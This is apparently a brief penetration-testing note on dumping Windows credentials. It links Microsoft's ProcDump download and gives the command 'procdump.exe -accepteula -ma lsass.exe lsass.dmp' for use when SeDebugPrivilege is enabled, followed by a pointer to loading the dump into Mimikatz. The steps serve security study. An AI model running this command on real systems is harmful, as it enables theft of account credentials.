https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

### SeDebugPriv enabled
run procdump
```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

if successful can load [[Mimikatz]]
